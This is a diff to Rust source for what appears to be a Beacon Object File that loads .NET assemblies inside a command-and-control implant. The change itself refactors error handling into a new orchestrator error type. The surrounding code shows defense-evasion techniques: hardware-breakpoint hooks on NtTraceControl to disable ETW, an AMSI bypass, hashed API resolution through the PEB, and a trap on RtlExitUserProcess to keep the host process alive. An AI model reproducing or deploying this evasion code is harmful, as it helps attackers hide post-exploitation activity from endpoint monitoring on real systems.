@@ -52,29 +52,34 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
         let asm_info = if a.mode == 1 {
             pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
         } else {
-            pe_parser::parse(&a.asm_bytes).map_err(|e| match e {
-                pe_parser::Error::MixedMode => BofError::MixedModeUnsupported,
-                pe_parser::Error::ArchMismatch => BofError::ArchMismatch,
-                other => BofError::PeParse(other),
-            })?
+            pe_parser::parse(&a.asm_bytes).map_err(|e| BofError::Orchestrator(match e {
+                pe_parser::Error::MixedMode => clr_orchestrator::OrchestratorError::MixedModeUnsupported,
+                pe_parser::Error::ArchMismatch => clr_orchestrator::OrchestratorError::ArchMismatch,
+                other => clr_orchestrator::OrchestratorError::PeParse(other),
+            }))?
         };
 
         rustbof::eprintln!("[dbg] pe parse ok");
-        let engine = opsec_hwbp::HwbpEngine::init().map_err(BofError::Hwbp)?;
+        let engine = opsec_hwbp::HwbpEngine::init()
+            .map_err(|e| BofError::Orchestrator(clr_orchestrator::OrchestratorError::Hwbp(e)))?;
         rustbof::eprintln!("[dbg] hwbp engine ok");
         let _etw = if a.etw {
             let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
             let exp_h = opsec_strcrypt::hash!("NtTraceControl");
             let target = opsec_peb::resolve_module(ntdll_h)
                 .and_then(|m| opsec_peb::resolve_export(m, exp_h))
-                .ok_or(BofError::PebResolve {
-                    module_hash: ntdll_h,
-                    export_hash: exp_h,
-                })?;
+                .ok_or(BofError::Orchestrator(
+                    clr_orchestrator::OrchestratorError::PebResolve {
+                        module_hash: ntdll_h,
+                        export_hash: exp_h,
+                    },
+                ))?;
             Some(
                 engine
                     .install_rip_ret(target as usize, 0)
-                    .map_err(BofError::Hwbp)?,
+                    .map_err(|e| BofError::Orchestrator(
+                        clr_orchestrator::OrchestratorError::Hwbp(e),
+                    ))?,
             )
         } else {
             None
@@ -132,7 +137,9 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
                     f(buf.as_ptr());
                 }
             }
-            Some(engine.install_amsi_set().map_err(BofError::Hwbp)?)
+            Some(engine.install_amsi_set().map_err(|e| BofError::Orchestrator(
+                clr_orchestrator::OrchestratorError::Hwbp(e),
+            ))?)
         } else {
             None
         };
@@ -152,13 +159,17 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
             let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
             let exit_target = opsec_peb::resolve_module(ntdll_h)
                 .and_then(|m| opsec_peb::resolve_export(m, exit_h))
-                .ok_or(BofError::PebResolve {
-                    module_hash: ntdll_h,
-                    export_hash: exit_h,
-                })?;
+                .ok_or(BofError::Orchestrator(
+                    clr_orchestrator::OrchestratorError::PebResolve {
+                        module_hash: ntdll_h,
+                        export_hash: exit_h,
+                    },
+                ))?;
             let _exit_trap = engine
                 .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
-                .map_err(BofError::Hwbp)?;
+                .map_err(|e| BofError::Orchestrator(
+                    clr_orchestrator::OrchestratorError::Hwbp(e),
+                ))?;
 
             rustbof::eprintln!("[dbg] dispatch start");
             let dispatch_result = clr::dispatch(
